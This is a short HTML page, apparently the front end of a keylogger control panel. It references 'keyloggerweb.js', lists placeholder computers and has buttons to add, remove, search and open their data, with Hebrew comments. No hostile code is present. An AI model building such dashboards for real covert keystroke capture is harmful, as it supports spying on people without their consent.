<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Computer Selection</title>
    <link rel="stylesheet" href="keyloggerweb_style.css">
</head>
<body>
    <div class="button-container">
        <button id="showList">Show List</button>
        <button id="addComputer">Add Computer</button>
        <button id="removeComputer">Remove Computer</button>
        <button id="searchComputer">Search Computer</button>
    </div>
    

    <div id="listContainer">
        <select name="select1" id="computerList">
            <option value="1">computer1</option>
            <option value="2">computer2</option>
            <option value="3">computer3</option>
            <option value="4">computer4</option>
        </select>
        <button id="openComputer">Open Computer Data</button> <!-- כפתור חדש -->

    </div>

    <script src="keyloggerweb.js"></script> <!-- קובץ ה-JS -->
</body>
</html>
